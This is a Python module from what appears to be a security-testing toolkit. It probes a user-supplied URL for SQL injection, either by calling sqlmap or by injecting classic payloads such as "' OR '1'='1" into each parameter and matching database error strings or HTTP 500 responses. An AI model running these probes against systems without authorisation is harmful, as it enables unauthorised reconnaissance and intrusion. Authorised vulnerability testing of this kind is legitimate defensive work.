from utils import validation, runner, formatter
import urllib.request
import urllib.error
import urllib.parse

SQL_ERRORS = [
    "you have an error in your sql syntax",
    "unclosed quotation mark",
    "warning: mysql",
    "pg_query(): query failed",
    "sqlite3::query",
    "ora-00933",
    "dynamic sql error",
    "microsoft ole db provider",
    "odbc microsoft access driver",
    "jdbc exception",
    "supplied argument is not a valid mysql"
]

TEST_PAYLOADS = ["'", '"', "''", "' OR '1'='1", '" OR "1"="1', "1' ORDER BY 1-- -"]

def run():
    url_input = input("Enter the full target URL with parameter (e.g. http://example.com/page.php?id=1): ").strip()

    if not url_input.startswith(("http://", "https://")):
        url_input = f"http://{url_input}"

    if "?" not in url_input or "=" not in url_input:
        formatter.error("URL must contain a parameter! e.g. http://example.com/page.php?id=1")
        return

    if runner.tool_available("sqlmap"):
        formatter.info("Using sqlmap for SQL injection detection.")
        output = runner.run_tool(["sqlmap", "-u", url_input, "--batch", "--level=5", "--risk=1"])
        if output.strip():
            print(output)
        else:
            formatter.error("sqlmap returned no results.")
    else:
        formatter.info("Using native Python SQL injection detector.")

        parsed = urllib.parse.urlparse(url_input)
        params = urllib.parse.parse_qs(parsed.query)
        vulnerable = False

        for param in params:
            formatter.info(f"Testing parameter: '{param}'")

            for payload in TEST_PAYLOADS:
                # Inject payload into current parameter
                modified = params.copy()
                modified[param] = [payload]
                new_query = urllib.parse.urlencode(modified, doseq=True)
                test_url = urllib.parse.urlunparse((
                    parsed.scheme, parsed.netloc, parsed.path,
                    parsed.params, new_query, parsed.fragment
                ))

                req = urllib.request.Request(test_url)
                req.add_header("User-Agent", "Mozilla/5.0")

                try:
                    with urllib.request.urlopen(req, timeout=5) as response:
                        html = response.read().decode("utf-8", errors="ignore").lower()
                        for sql_err in SQL_ERRORS:
                            if sql_err in html:
                                formatter.success(f"SQL injection detected on param '{param}' with payload: {payload}")
                                formatter.info(f"Matched signature: '{sql_err}'")
                                vulnerable = True
                                break

                except urllib.error.HTTPError as e:
                    # HTTP 500 often means the SQL query broke the server
                    if e.code == 500:
                        formatter.success(f"Possible SQL injection on param '{param}' — server returned HTTP 500 with payload: {payload}")
                        vulnerable = True
                    else:
                        try:
                            html = e.read().decode("utf-8", errors="ignore").lower()
                            for sql_err in SQL_ERRORS:
                                if sql_err in html:
                                    formatter.success(f"SQL injection detected on param '{param}' with payload: {payload}")
                                    formatter.info(f"Matched signature: '{sql_err}'")
                                    vulnerable = True
                                    break
                        except Exception:
                            pass

                except Exception as e:
                    formatter.error(f"Error testing payload '{payload}': {e}")

                if vulnerable:
                    break

        if not vulnerable:
            formatter.info("No SQL injection vulnerabilities detected with common payloads.")
